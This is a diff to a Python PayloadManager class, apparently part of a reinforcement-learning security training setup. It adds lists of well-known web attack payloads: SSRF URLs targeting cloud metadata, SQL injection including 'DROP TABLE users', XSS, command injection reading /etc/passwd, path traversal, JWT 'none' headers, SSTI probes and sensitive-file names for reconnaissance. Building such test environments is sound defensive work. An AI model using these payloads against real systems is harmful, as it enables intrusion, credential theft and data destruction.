@@ -13,7 +13,77 @@ class PayloadManager:
     def __init__(self, unified_data_path: str = None, seed: int = None):
         # Deterministic RNG for RL Stability
         self.rng = random.Random(seed)
+        self.unified_data_path = unified_data_path
         
+        # --- SSRF PAYLOADS ---
+        self.ssrf_cloud = [
+            'http://169.254.169.254/latest/meta-data/',
+            'http://metadata.google.internal/computeMetadata/v1/',
+            'http://127.0.0.1:22',
+            'http://[::1]:80',
+            'file:///etc/passwd',
+            'dict://localhost:11211'
+        ]
+        
+        self.sql_auth_bypass = [
+            "' OR '1'='1",
+            "admin' --",
+            "' OR 1=1 --",
+            "admin' #",
+            "' OR 'x'='x"
+        ]
+        
+        self.sql_injection = [
+            "' UNION SELECT 1,2,3--",
+            "1' ORDER BY 10--",
+            "1; DROP TABLE users--"
+        ]
+        
+        self.xss_scripts = [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "javascript:alert(1)"
+        ]
+        
+        self.cmd_injection = [
+            "; cat /etc/passwd",
+            "| whoami",
+            "$(id)"
+        ]
+        
+        self.path_traversal = [
+             "../../../../etc/passwd",
+             "..\\..\\windows\\win.ini",
+             "/var/www/html/index.php"
+        ]
+        
+        self.common_passwords = [
+             "password", "123456", "admin", "welcome"
+        ]
+        
+        # OSINT / Reconnaissance
+        self.osint_files = [
+            "robots.txt", ".git/config", ".env", "package.json",
+            "composer.json", "web.config", ".htaccess", "backup.sql"
+        ]
+        
+        # JWT Payloads
+        self.jwt_none_algorithm = [
+            {"alg": "none", "typ": "JWT"},
+            {"alg": "None", "typ": "JWT"}
+        ]
+        
+        # SSTI Payloads
+        self.ssti_payloads = [
+            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"
+        ]
+        
+        # Deserialization
+        self.deserialization_payloads = [
+            'O:8:"stdClass":0:{}',
+            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=='
+        ]
+    
     def seed(self, seed: int = None):
         """Reseed the random number generator."""
         self.rng.seed(seed)
@@ -31,8 +101,8 @@ class PayloadManager:
         self.honeypot_attack_types = {}
         
         # Load unified Kaggle data if provided
-        if unified_data_path and os.path.exists(unified_data_path):
-            self._load_unified_kaggle_data(unified_data_path)
+        if self.unified_data_path and os.path.exists(self.unified_data_path):
+            self._load_unified_kaggle_data(self.unified_data_path)
         
         # --- SQL Injection (2025 Edition: JSON-Based & PostgreSQL CVE-2025-1094) ---
         self.sqli_payloads = [
